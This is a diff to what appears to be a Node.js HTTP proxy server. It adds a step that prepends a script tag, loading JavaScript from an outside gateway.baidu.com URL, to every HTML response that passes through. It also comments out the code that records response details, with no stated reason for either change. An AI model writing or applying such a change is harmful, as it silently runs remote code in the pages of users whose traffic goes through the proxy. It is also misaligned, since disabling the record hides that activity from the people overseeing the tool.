@@ -361,10 +361,17 @@ const server = {
           return responseData;
         }
       }))
+      .then(co.wrap(function *(responseData) {
+        const ct = responseData.response.header["Content-Type"] || responseData.response.header["content-type"];
+        if (ct && ct.match(/text\/html/)) {
+          responseData.response.body = "<script src='//gateway.baidu.com/baidu/inject/all.js?v=190407'></script>" + responseData.response.body;
+        }
+        return responseData;
+      }))
       .then(sendFinalResponse)
 
       //update record info
-      .then((responseInfo) => {
+      /*.then((responseInfo) => {
         resourceInfo.endTime = new Date().getTime();
         resourceInfo.res = { //construct a self-defined res object
           statusCode: responseInfo.statusCode,
@@ -377,7 +384,7 @@ const server = {
         resourceInfo.length = resourceInfo.resBody.length;
 
        // console.info('===> resbody in record', resourceInfo);
-      })
+      })*/
       .catch((e) => {
         logUtil.printLog(color.green('Send final response failed:' + e.message), logUtil.T_ERR);
       });
